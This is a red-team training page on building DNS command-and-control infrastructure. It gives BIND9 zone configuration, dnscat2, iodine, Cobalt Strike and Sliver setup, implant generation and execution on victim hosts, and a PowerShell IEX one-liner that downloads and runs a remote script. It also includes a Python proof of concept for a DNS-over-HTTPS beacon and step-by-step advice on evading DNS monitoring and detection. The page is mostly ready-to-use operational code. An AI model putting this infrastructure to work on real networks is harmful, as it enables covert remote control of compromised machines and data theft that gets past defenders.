---
layout: training-page
title: "DNS C2 Infrastructure — Red Team Academy"
module: "Infrastructure Engineering"
tags:
  - infrastructure
  - dns
  - c2
  - dnscat2
  - iodine
page_key: "infrastructure-dns-c2-infra"
render_with_liquid: false
---

# DNS C2 Infrastructure

DNS is one of the most reliable C2 channels in highly-restricted network environments. Nearly every corporate network allows outbound DNS resolution — it's required for basic internet function. DNS C2 exploits this by encoding command and control traffic in DNS queries and responses, bypassing HTTP/HTTPS egress controls, application-layer proxies, and most DLP systems.

## Why DNS C2

```
HTTP C2 failure modes in restricted environments:
  - Explicit proxy required: no direct HTTPS allowed outbound
  - SSL inspection: all HTTPS decrypted and inspected by Zscaler/PAN
  - Proxy authentication: credentials required, beacon can't authenticate
  - Application whitelisting: only known application traffic allowed

DNS almost always succeeds because:
  - DNS is fundamental infrastructure — blocking it breaks everything
  - Many organizations allow DNS to bypass proxy (or to specific resolvers)
  - DNS traffic is high-volume (millions of queries/day) — C2 blends in
  - DNS is rarely deeply inspected (most orgs log queries but don't inspect payload)
  - Even in airgapped environments: DNS often escapes to internal resolver
    which then reaches internet
```

## Authoritative DNS Server Setup

### Architecture

```
Attack domain: c2ops.yourdomain.com
NS record: c2ops.yourdomain.com → ns1.yourdomain.com
ns1.yourdomain.com → YOUR VPS IP (authoritative nameserver)

Flow:
  Victim DNS query: cmd.beacon.c2ops.yourdomain.com
       ↓
  Victim's local resolver → ISP resolver → Authoritative NS
       ↓
  YOUR VPS receives query (contains beacon data in label)
  YOUR VPS responds (contains C2 command in TXT/A record)
```

### BIND9 Configuration

```bash
# Install BIND9 on VPS
apt update && apt install -y bind9 bind9utils

# /etc/bind/named.conf.local — add zone

zone "c2ops.yourdomain.com" {
    type master;
    file "/etc/bind/zones/db.c2ops";
    allow-transfer { none; };
    allow-query { any; };
};

# /etc/bind/zones/db.c2ops — zone file

$ORIGIN c2ops.yourdomain.com.
$TTL 60    ; Low TTL to prevent caching issues

@   IN SOA ns1.c2ops.yourdomain.com. admin.yourdomain.com. (
            2026041701  ; Serial
            3600        ; Refresh
            900         ; Retry
            604800      ; Expire
            60 )        ; Minimum TTL

; Nameserver records
@   IN NS  ns1.c2ops.yourdomain.com.

; Glue record for nameserver
ns1 IN A   [YOUR_VPS_IP]

; Wildcard A record (catches all subdomain queries — required for dnscat2/iodine)
*   IN A   [YOUR_VPS_IP]
```

```bash
# Set permissions and start BIND9
chown -R bind:bind /etc/bind/zones/
named-checkzone c2ops.yourdomain.com /etc/bind/zones/db.c2ops
named-checkconf

systemctl restart bind9
systemctl enable bind9

# Test zone resolution
dig @[YOUR_VPS_IP] c2ops.yourdomain.com NS
dig @[YOUR_VPS_IP] test.c2ops.yourdomain.com A
# Expected: wildcard A record returns YOUR_VPS_IP
```

### NS Record Delegation

```bash
# At your domain registrar (yourdomain.com), add:
# DNS records for yourdomain.com:

# NS record delegating c2ops subdomain to your VPS
c2ops.yourdomain.com.   IN  NS  ns1.c2ops.yourdomain.com.

# Glue record (required because NS points to itself)
ns1.c2ops.yourdomain.com.  IN  A  [YOUR_VPS_IP]

# Verification (from any resolver):
dig c2ops.yourdomain.com NS
# Should return: ns1.c2ops.yourdomain.com.
# With additional: ns1.c2ops.yourdomain.com A [YOUR_VPS_IP]

# Test round-trip
dig @8.8.8.8 test.c2ops.yourdomain.com A
# Should return: YOUR_VPS_IP
```

## DNS Query Types for C2

| Query Type | Direction | Use Case |
|-----------|-----------|---------|
| TXT records | C2 → Implant (in response) | Commands, download URLs, config |
| A records | Implant → C2 (in query subdomain) | Beacon check-in, small data exfil |
| CNAME | Redirector | Aliases to C2-controlled domain |
| MX | Alternate channel | Less common, useful for variety |
| NULL | Bidirectional | Maximum data per query (128 bytes in response) |

```
DNS beacon data encoding example:

Implant encodes beacon data as subdomain:
  Query: 4142434445464748494a.beacon.c2ops.yourdomain.com A
         ^^^^^^^^^^^^^^^^^^^^ = base16-encoded beacon packet

C2 server receives query, decodes 41424344... = "ABCDEFGHIJ"
C2 server encodes response command in A record: 
  10.0.0.1 = (each octet encodes data — custom protocol)
  OR returns TXT record with base64-encoded command

Practical encoding:
  DNS label max: 63 bytes per label
  DNS name max: 253 bytes total
  Usable per query: ~150 bytes of encoded data (after domain overhead)
```

## dnscat2 Infrastructure

dnscat2 is a mature DNS-based C2 tool with a server/client architecture.

```bash
# Server setup on VPS (authoritative for c2ops.yourdomain.com)
# Prerequisite: BIND9 running and wildcard DNS configured

# Install dnscat2 server
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server
gem install bundler
bundle install

# Start dnscat2 server
ruby ./dnscat2.rb c2ops.yourdomain.com \
  --secret [SHARED_SECRET] \
  --no-cache \
  --dns port=53,host=0.0.0.0

# Output:
# New window created: 0
# dnscat2> Starting DNS server...

# Options:
#   --secret: pre-shared key for client authentication
#   --no-cache: disable query caching (important for C2)
#   --security=open: if no pre-shared key needed (insecure)
```

### dnscat2 Client Generation

```powershell
# Windows PowerShell client (compile on target or use pre-compiled)
# Download: https://github.com/iagox86/dnscat2/releases

# Run client pointing to your domain
.\dnscat2-v0.07-client-win32.exe --secret [SHARED_SECRET] c2ops.yourdomain.com

# Alternative: use PowerShell dnscat2 client
# https://github.com/lukebaggett/dnscat2-powershell
IEX (New-Object Net.WebClient).DownloadString('http://yourserver/invoke-dnscat2.ps1')
Invoke-DNScat2 -Domain c2ops.yourdomain.com -DNSServer [VPS_IP] -Passwd [SECRET]
```

### dnscat2 Session Management

```
Server commands:
  dnscat2> sessions          # List active sessions
  dnscat2> session -i 1      # Interact with session 1
  dnscat2/1> shell           # Request shell in session
  dnscat2/1> exec calc.exe   # Execute command
  dnscat2/1> download /path/file  # Download file over DNS
  dnscat2/1> upload /localfile /path  # Upload file over DNS

Tunneling:
  # Port forward: local port 8080 → victim's 192.168.1.1:80
  dnscat2/1> listen 127.0.0.1:8080 192.168.1.1:80
```

## iodine DNS Tunnel

iodine tunnels IPv4 over DNS. Unlike dnscat2 (which has a custom protocol), iodine creates a full IP tunnel, allowing any IP traffic over DNS.

```bash
# Server setup
apt install iodine

# Start iodine server
iodined -f -c -P [PASSWORD] 10.53.53.1 c2ops.yourdomain.com
# -f: foreground
# -c: disable client IP check (allows NAT)
# -P: password
# 10.53.53.1: server-side tunnel IP
# c2ops.yourdomain.com: tunnel domain

# Firewall: allow DNS from anywhere
ufw allow 53/udp
ufw allow 53/tcp
```

```bash
# Client setup (run on victim system)
iodine -f -P [PASSWORD] [VPS_IP] c2ops.yourdomain.com
# Creates: dns0 interface with IP 10.53.53.2

# Verify tunnel
ping 10.53.53.1   # Should reach server through DNS

# Use tunnel for SSH
ssh -o "ProxyCommand=none" root@10.53.53.1

# Or: use as SOCKS proxy via SSH through tunnel
ssh -D 1080 root@10.53.53.1
# Then configure browser to use SOCKS5 at 127.0.0.1:1080
```

## Cobalt Strike DNS Listener

```
Cobalt Strike DNS listener setup:
  Team Server → Listeners → Add

  Payload: DNS
  Name: DNS_C2
  DNS Hosts: c2ops.yourdomain.com
  DNS Host (Stager): c2ops.yourdomain.com
  Bind Port: 53

# Verify Cobalt Strike receives DNS queries:
# On VPS: tcpdump -n port 53
# On victim: nslookup test.c2ops.yourdomain.com [VPS_IP]

# Cobalt Strike DNS beacon generation:
# Attacks → Packages → Windows Executable (S)
# Listener: DNS_C2
# Output: stageless EXE or PowerShell

# Beacon timing for DNS (slower than HTTPS):
# Typical: 30-60 second sleep, high jitter
# DNS beacons are slower — account for this in operational timelines
```

## Sliver DNS C2 Configuration

```bash
# Sliver server — start DNS listener
[server] > dns --domains c2ops.yourdomain.com --lhost 0.0.0.0 --lport 53

# Verify listener
[server] > jobs
# ID  Name  Protocol  Port
#  1  dns   dns/udp   53

# Generate DNS implant
[server] > generate --dns c2ops.yourdomain.com \
  --os windows \
  --arch amd64 \
  --format exe \
  --save /tmp/dns_beacon.exe

# Implant execution on victim
.\dns_beacon.exe

# Session appears in Sliver:
[server] > sessions
# ID  Transport  Remote Address  Hostname  Username
#  1  dns        [VICTIM_IP]     WINPC01   CORP\jdoe

[server] > use 1
[sliver] > shell
```

## Beacon Timing: Low and Slow DNS

```
DNS C2 detection risk increases with:
  - High query volume (many queries per minute)
  - Consistent timing (machine-regular intervals)
  - Unusual subdomain patterns (long, base64-looking labels)

Low-and-slow DNS configuration:

Cobalt Strike (malleable profile):
  set sleeptime "300000";    # 5 minutes between beacons
  set jitter "40";           # ±40% randomization
  set dns_sleep "0";         # Sleep between DNS requests
  
Sliver:
  [sliver] > sleep 5m
  [sliver] > jitter 2m

dnscat2:
  dnscat2/1> delay 300000    # 5 minute polling

Target beacon interval: 3-10 minutes with ±30-50% jitter
This generates ~8-20 DNS queries per beacon cycle — very low volume
Compare: normal workstation makes ~1000 DNS queries per hour
```

## Detection Evasion for DNS C2

### Domain Patterns

```
Realistic vs. suspicious subdomain patterns:

Suspicious:
  4142434445464748494a4b4c4d4e.beacon.c2ops.yourdomain.com
  (Long hex/base64 labels — obvious encoding)

Less suspicious:
  api-1.v2.service.c2ops.yourdomain.com
  update.cdn.service.c2ops.yourdomain.com
  
Most realistic (requires custom C2 code):
  www-corp.updates.microsoft.c2ops.yourdomain.com
  (Mimics real corporate DNS patterns)

Note: Modern DNS analytics tools (Cisco Umbrella, PassiveDNS)
      detect entropy in subdomains — even "realistic" labels are analyzed
```

### TTL Configuration

```
TTL strategy for DNS C2:
  - Short TTL (60 seconds): responses not cached — each beacon is a fresh query
  - Standard TTL (300-3600): may cause command delays if cached

For C2 zone:
  $TTL 60   ; Short TTL to prevent caching

  But: short TTL on ALL records may itself be suspicious
  Balance: use TTL 300 for cover records, TTL 60 for beacon subdomain zone
```

### Mimicking Legitimate DNS Traffic

```bash
# Add cover traffic to your DNS zone — makes queries look more normal
# Zone includes realistic-looking records:

; /etc/bind/zones/db.c2ops
cdn         IN A   [VPS_IP]
api         IN A   [VPS_IP]
static      IN A   [VPS_IP]
assets      IN A   [VPS_IP]
update      IN A   [VPS_IP]
docs        IN A   [VPS_IP]
mail        IN MX  10 mail.yourdomain.com.

; Realistic TXT records
@           IN TXT "v=spf1 a mx ~all"
_dmarc      IN TXT "v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com"
```

## DNS over HTTPS (DoH) for C2

DNS over HTTPS routes DNS queries over HTTPS to a DoH resolver, hiding DNS traffic from network monitors that inspect port 53.

```
Problem: Corporate network logs all port 53 DNS queries (common)
Solution: Route DNS C2 traffic over HTTPS to a DoH provider

DoH providers:
  Cloudflare: 1.1.1.1, https://cloudflare-dns.com/dns-query
  Google: 8.8.8.8, https://dns.google/dns-query
  Quad9: 9.9.9.9, https://dns.quad9.net/dns-query

DoH request format:
  GET https://cloudflare-dns.com/dns-query?name=test.c2ops.yourdomain.com&type=TXT
  Accept: application/dns-json

DoH C2 concept:
  Implant sends DoH query to Cloudflare → Cloudflare resolves via standard DNS
  → YOUR BIND9 receives query (DNS query from Cloudflare IP, not victim)
  → Response returns to Cloudflare → DoH response to implant over HTTPS

Network observer sees: HTTPS traffic to 1.1.1.1 (Cloudflare DNS — whitelisted)
Actual content: DNS C2 beacon queries
```

```python
# Simple DoH beacon check-in (Python proof of concept)
import requests, base64, json

def doh_query(name, qtype="TXT"):
    url = "https://cloudflare-dns.com/dns-query"
    headers = {"Accept": "application/dns-json"}
    params = {"name": name, "type": qtype}
    r = requests.get(url, headers=headers, params=params, verify=True)
    return r.json()

def beacon_checkin(c2_domain, session_id, data):
    # Encode data as base32 (DNS-safe charset)
    encoded = base64.b32encode(data.encode()).decode().lower().rstrip('=')
    # Split into 63-char labels
    labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    query = f"{session_id}.{''.join(labels)}.{c2_domain}"
    result = doh_query(query)
    # Parse command from TXT response
    if result.get('Answer'):
        for ans in result['Answer']:
            if ans['type'] == 16:  # TXT record
                return base64.b64decode(ans['data'].strip('"'))
    return None

# Beacon
response = beacon_checkin("c2ops.yourdomain.com", "sess001", "CHECKIN")
```

## DNS Firewall Rules

```bash
# Allow only UDP/TCP 53 from anywhere (DNS must be reachable by resolvers)
ufw allow 53/udp
ufw allow 53/tcp

# CRITICAL: The DNS server must accept queries from ANYWHERE
# (DNS resolvers around the world query it on behalf of victims)
# Do NOT restrict port 53 by source IP

# Restrict management ports to operator only
ufw allow from [OPERATOR_VPN_IP] to any port 22
ufw allow from [OPERATOR_VPN_IP] to any port 53953  # if using non-standard BIND port

# For Cobalt Strike DNS listener:
# CS listens on port 53 AND manages its own DNS server
# If using BIND9 for DNS, coordinate with CS:
#   Option A: BIND9 forwards c2 subdomain queries to CS (port 5353 locally)
#   Option B: CS runs on port 53 directly (no BIND9)

# BIND9 forward to CS on localhost for beacon subdomain:
# named.conf.local zone type forward:
zone "beacon.c2ops.yourdomain.com" {
    type forward;
    forwarders { 127.0.0.1 port 5353; };
};
```
